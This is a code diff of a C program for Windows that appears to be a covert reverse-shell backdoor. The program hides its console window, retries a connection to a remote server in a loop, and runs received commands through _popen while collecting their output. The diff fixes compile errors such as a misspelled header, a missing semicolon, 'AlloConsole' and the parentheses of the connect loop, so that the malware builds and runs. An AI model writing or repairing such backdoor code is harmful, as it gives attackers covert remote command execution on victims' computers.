@@ -1,4 +1,4 @@
-#include <studio.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <winsock2.h>
@@ -33,7 +33,7 @@ void Shell() {
     }
     else{
       FILE *fp;
-      fp = _popen(buffer, "r")
+      fp = _popen(buffer, "r");
       while(fgets(container, sizeof(container), fp) != NULL) {
         strcat(total_response, container);
       }
@@ -42,13 +42,13 @@ void Shell() {
     }
 
   }
-  
+
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
 
   HWND stealth;
-  AlloConsole();
+  AllocConsole();
   stealth = FindWindowA("ConsoleWindowClass", NULL);
 
   ShowWindow(stealth, 0);
@@ -74,7 +74,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 
 
   start:
-  while connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0) {
+  while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
     Sleep(10);
     goto start;
   }
